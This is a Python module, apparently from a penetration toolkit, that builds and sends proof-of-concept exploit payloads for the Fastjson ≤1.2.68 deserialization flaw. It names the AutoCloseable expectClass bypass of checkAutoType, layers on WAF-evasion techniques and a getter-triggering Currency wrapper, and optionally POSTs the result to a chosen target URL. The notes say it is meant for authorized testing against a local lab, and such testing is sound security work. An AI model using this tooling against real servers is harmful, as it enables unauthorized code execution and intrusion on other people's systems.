"""Fastjson ≤1.2.68 证明 PoC：生成 payload，可选 POST 到授权目标。"""

from __future__ import annotations

from typing import Optional

import httpx

from fastjson_toolkit.poc.v1_2_68.catalog import get_gadget, list_gadgets
from fastjson_toolkit.poc.v1_2_68.models import (
    Poc1268GenerateOptions,
    Poc1268GenerateResult,
    Poc1268SendOptions,
    Poc1268SendResult,
)
from fastjson_toolkit.poc.getter import wrap_with_currency
from fastjson_toolkit.poc.v1_2_68.payloads import build_payload
from fastjson_toolkit.waf import apply_waf_payload

COMMON_NOTES = [
    "原理：双 @type，首个 java.lang.AutoCloseable 作 expectClass，"
    "绕过 checkAutoType（≤1.2.68；1.2.69 起 AutoCloseable 进黑名单）。",
    "仅用于授权测试 / 本地靶场。依赖靶场：http://127.0.0.1:18168/api/fastjson",
    "payload 含重复 @type / StringCodec 畸形写法，勿再 json.dumps 规范化。",
    "getter：$ref 已内嵌；业务点另有期望类时可开 wrap_currency 套 Currency"
    "（MiscCodec，与版本无关）。",
]


def generate_poc_1268(
    options: Optional[Poc1268GenerateOptions] = None,
) -> Poc1268GenerateResult:
    opts = options or Poc1268GenerateOptions()
    entry = get_gadget(opts.gadget)
    raw = build_payload(
        entry.id,
        file=opts.file,
        content=opts.content,
        source=opts.source,
        url=opts.url,
        guess_byte=opts.guess_byte,
        bom_bytes=opts.bom_bytes,
        host=opts.host,
        port=opts.port,
        user=opts.user,
        jdbc_url=opts.jdbc_url,
        socket_factory_arg=opts.socket_factory_arg,
    )
    if opts.wrap_currency:
        raw = wrap_with_currency(raw, currency_field=opts.currency_field)
    payload, waf_techs, waf_notes = apply_waf_payload(
        raw, opts.waf_techniques, opts.waf_options
    )
    notes = list(COMMON_NOTES)
    notes.append(entry.description)
    if opts.wrap_currency:
        notes.append(
            f"已套 java.util.Currency（字段 {opts.currency_field}）以触发 getter。"
        )
    notes.extend(waf_notes)
    return Poc1268GenerateResult(
        ok=True,
        gadget=entry.id,
        title=entry.title,
        payload=payload,
        payload_raw=raw if waf_techs else None,
        wrap_currency=opts.wrap_currency,
        waf_techniques=waf_techs,
        notes=notes,
        requires=list(entry.requires),
        jdk=entry.jdk,
    )


def run_poc_1268(
    options: Optional[Poc1268SendOptions] = None,
) -> Poc1268SendResult:
    opts = options or Poc1268SendOptions()
    gen = generate_poc_1268(opts)
    summary = f"已生成 {gen.title} payload（未发送）"
    if gen.waf_techniques:
        summary += f"；WAF: {' → '.join(gen.waf_techniques)}"
    result = Poc1268SendResult(
        ok=True,
        gadget=gen.gadget,
        title=gen.title,
        payload=gen.payload,
        payload_raw=gen.payload_raw,
        wrap_currency=gen.wrap_currency,
        waf_techniques=gen.waf_techniques,
        sent=False,
        summary=summary,
        notes=gen.notes,
        requires=gen.requires,
        jdk=gen.jdk,
    )
    if not opts.send:
        return result

    target = opts.target.strip()
    if not target:
        result.ok = False
        result.summary = "target 不能为空"
        return result

    headers = {"Content-Type": opts.content_type, **(opts.headers or {})}
    try:
        with httpx.Client(
            timeout=opts.timeout,
            proxy=opts.proxy,
            verify=not opts.insecure,
            follow_redirects=True,
            trust_env=False,
        ) as client:
            resp = client.post(target, content=gen.payload.encode("utf-8"), headers=headers)
    except Exception as exc:  # noqa: BLE001
        result.ok = False
        result.sent = True
        result.summary = f"发送失败: {exc}"
        result.raw = {"error": str(exc)}
        return result

    preview = (resp.text or "")[:2000]
    result.sent = True
    result.status_code = resp.status_code
    result.response_preview = preview
    result.raw = {
        "status_code": resp.status_code,
        "headers": dict(resp.headers),
    }
    result.ok = True
    result.summary = (
        f"已 POST {gen.title} → HTTP {resp.status_code}（请结合 /api/markers / 报错 / DNS 确认）"
    )
    return result


__all__ = [
    "COMMON_NOTES",
    "generate_poc_1268",
    "list_gadgets",
    "run_poc_1268",
]
